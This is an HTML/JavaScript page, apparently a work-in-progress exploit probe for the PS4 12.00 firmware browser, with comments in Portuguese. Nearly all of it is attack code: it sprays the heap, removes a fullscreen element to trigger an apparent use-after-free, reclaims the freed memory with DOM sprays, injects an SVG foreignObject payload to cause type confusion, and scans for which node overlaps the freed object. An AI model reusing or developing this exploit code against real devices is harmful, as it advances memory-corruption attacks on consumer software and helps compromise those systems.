
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Cross Contamination Probe</title>

<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Attribute Contamination → Target Lock</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP ORIGINAL (100% INALTERADO)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");
    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    Object.assign(fsTarget.style,{
        background:"black", width:"100%", height:"100%", position:"absolute", top:"0", left:"0"
    });
    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();
    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);
    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }
    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (100% INALTERADO)
function inject(child){
    try{
        child.outerHTML = `<svg><foreignObject width="100%" height="100%"><div xmlns="http://www.w3.org/1999/xhtml">AAAA</div></foreignObject></svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 CONTAMINATION PROBE (O SCANNER DE GÊMEOS)
function domOverlapProbe(fsTarget){
    log("---- CROSS CONTAMINATION PROBE ----");

    try{
        let n = fsTarget.firstChild;
        if(!n) return;

        if(n.nodeType === 1){
            log("[!] Zumbi isolado. Carimbando atributo invisível...");

            // 🔥 A MÁGICA: Nós gravamos uma assinatura no zumbi SVG
            try {
                n.setAttribute("data-zumbi", "1337");
                log("[+] Atributo 'data-zumbi' escrito no fantasma!");
            } catch(e) {
                log("[UAF] Erro ao carimbar atributo");
            }

            // ==========================
            // 🔥 A CAÇADA (Quem herdou o atributo fisicamente?)
            log("[*] Varrendo o Reclaim em busca do hospedeiro...");
            
            let h1s = document.getElementsByTagName("h1");
            let divs = document.getElementsByTagName("div");
            
            // 1. Checando os H1s
            for(let i=0; i<h1s.length; i++){
                // Se o H1 ganhou o atributo do SVG, eles são a mesma memória!
                if(h1s[i].getAttribute("data-zumbi") === "1337"){
                    log("[$$$] TARGET LOCKED! O Zumbi está sobrepondo o H1 [" + i + "]!");
                    return;
                }
                // Se o texto do H1 corrompeu, o zumbi sobrepôs o TextNode!
                if(h1s[i].innerHTML && h1s[i].innerHTML.includes("CONTROL") === false && !h1s[i].innerHTML.includes("FULLSCREEN")){
                    log("[$$$] TARGET LOCKED! O Zumbi esmagou o TextNode do H1 [" + i + "]!");
                    return;
                }
            }

            // 2. Checando as DIVs
            for(let i=0; i<divs.length; i++){
                // Ignora o Fullscreen e controles limpos
                if(divs[i].innerHTML.includes("FULLSCREEN")) continue;

                // Se a DIV ganhou o atributo, a conexão é nela!
                if(divs[i].getAttribute("data-zumbi") === "1337"){
                    log("[$$$] TARGET LOCKED! O Zumbi está sobrepondo uma DIV de controle!");
                    return;
                }
            }
            
            log("[SCAN] Hospedeiro não identificado neste ciclo.");
        }
    }catch(e){
        log("[UAF] Probe total crash");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");
    try{
        fsTarget.remove();
        if(document.webkitIsFullScreen || document.fullscreenElement) document.webkitExitFullscreen?.();
    }catch(e){}

    let sizes=[1500,2000,2500,3000];
    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 180);
    setTimeout(()=>domOverlapProbe(fsTarget), 280);

    setTimeout(()=>{ alert(logBuffer.join("\n")); }, 450);
    setTimeout(()=>location.reload(), 600);
}

// ==========================
// MAIN
function runTest(){
    log("[*] Iniciando Cross Contamination...");
    
    window.heap_press = setupHeap(); 

    let fsTarget=setupFullscreen();
    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>
